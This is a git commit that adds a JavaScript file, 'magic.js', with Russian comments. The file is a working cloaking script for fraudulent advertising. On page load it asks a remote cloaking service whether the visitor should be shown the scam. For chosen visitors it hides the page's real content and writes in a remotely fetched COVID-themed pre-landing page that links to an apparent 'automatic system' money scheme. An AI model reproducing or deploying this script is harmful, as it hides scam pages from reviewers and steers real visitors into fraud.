d3c65ac9a886e4af80b225d5e99328687248fb50
Denis8854 <37094139+Denis8854@users.noreply.github.com>
2020-10-18 15:40:24 +0300

    Add files via upload

---
+++ magic.js
@@ -0,0 +1,36 @@
+var binomCampaingKey = '59459z4egzuuxou49s0b'; /*Netlify_Urotrin, id:373. Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
+var landingUrl = 'https://cloaking.site/landing/homework/covid_2/'; /*Адрес преленда, который необходимо подгрузить*/
+var gitHubId = ''; /*ID созданного в первой части гайда Google-сайта. Только ID, не вся ссылка!*/
+var moneyPageUrl = 'https://evolvedsystem.online/automatycznysystem?'; /*Адрес манипейдж, который будет подставлен в ссылки на преленде*/
+var landingLoadingId = '';
+
+var landing = landingUrl + "?mpurl=" + moneyPageUrl;
+/* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!*/
+
+var url = 'https://cloaking.site/binom/?bckey='+binomCampaingKey;
+var xhr = new XMLHttpRequest();
+var cloakResult = 'no';
+
+xhr.open('GET', url, false);
+xhr.send();
+
+if (xhr.status == 200) {
+  cloakResult = xhr.responseText;
+} 
+
+if(cloakResult=="yes"){
+var xhrLand = new XMLHttpRequest();
+var landingCode = '';
+
+xhrLand.open('GET', landing, false);
+xhrLand.send();
+
+if (xhrLand.status == 200) {
+  landingCode = xhrLand.responseText;
+}
+
+document.write("<style>#swrap{display:none;}</style>")
+
+document.write(landingCode);
+
+}
